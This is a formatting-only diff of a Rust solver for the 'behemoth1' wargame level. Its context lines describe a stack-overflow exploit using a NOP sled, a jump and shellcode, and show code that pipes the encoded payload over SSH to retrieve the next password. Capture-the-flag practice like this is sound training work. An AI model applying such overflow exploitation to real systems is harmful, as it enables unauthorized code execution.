@@ -1,12 +1,11 @@
-use anyhow::Result;
 use crate::util::*;
+use anyhow::Result;
 
 /// behemoth1 is a basic stack overflow. however updates to the box (linux version, libc etc) prevent some old methods from working
 /// the stack is executable: approach is fill it with nops, end with a short jump, then the overflow ret register, then shell code,
 /// so execution will be hit overflow, jump back to beginning of variable stack, follow nops, jump over overflow and start shell code.
 /// shellcode used just reads the target file, and is sourced from here: https://shell-storm.org/shellcode/files/shellcode-73.html
 pub fn solve(password: &str) -> Result<String> {
-
     let session = ssh_session(super::HOST, super::PORT, "behemoth1", password)?;
 
     let mut channel = session.channel_session()?;
@@ -34,12 +33,12 @@ pub fn solve(password: &str) -> Result<String> {
 
     let cmd = format!("echo -e \"{encoded}\" | {target}");
     write_line(&mut channel, &cmd)?;
-    
+
     println!("reading result");
 
     let result = read_until(&mut channel, "behemoth1@gibson:~$ ")?;
     let result: Vec<&str> = result.split("\n").collect();
-    let result = result[result.len()-2].trim();
+    let result = result[result.len() - 2].trim();
     println!("retrieved behemoth2 pass '{result}'\n");
 
     Ok(result.to_string())
